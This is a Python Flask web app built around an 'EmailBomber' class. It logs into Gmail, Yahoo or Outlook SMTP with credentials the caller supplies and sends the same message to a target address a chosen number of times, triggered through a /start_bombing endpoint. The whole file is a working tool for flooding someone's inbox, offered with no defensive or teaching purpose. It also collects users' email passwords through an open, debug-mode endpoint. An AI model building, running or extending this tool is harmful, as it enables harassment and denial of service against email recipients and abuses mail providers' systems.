from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import smtplib

app = Flask(__name__)
CORS(app)

class EmailBomber:
    def __init__(self, target, server, fromAddr, fromPwd, subject, message, amount):
        self.target = target
        self.fromAddr = fromAddr
        self.fromPwd = fromPwd
        self.subject = subject
        self.message = message
        self.amount = int(amount)
        self.count = 0

        if server == '1':
            self.server = 'smtp.gmail.com'
        elif server == '2':
            self.server = 'smtp.mail.yahoo.com'
        elif server == '3':
            self.server = 'smtp-mail.outlook.com'

        self.port = 587
        self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}\n"
        self.s = smtplib.SMTP(self.server, self.port)
        self.s.ehlo()
        self.s.starttls()
        self.s.ehlo()
        self.s.login(self.fromAddr, self.fromPwd)

    def send_email(self):
        self.s.sendmail(self.fromAddr, self.target, self.msg)
        self.count += 1

    def attack(self):
        for _ in range(self.amount):
            self.send_email()
        self.s.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_bombing', methods=['POST'])
def start_bombing():
    data = request.json
    bomber = EmailBomber(
        data['target'], data['server'], data['fromAddr'], data['fromPwd'],
        data['subject'], data['message'], data['amount']
    )
    bomber.attack()
    return jsonify({'message': f'Successfully sent {bomber.count} emails.'})

if __name__ == '__main__':
    app.run(debug=True)
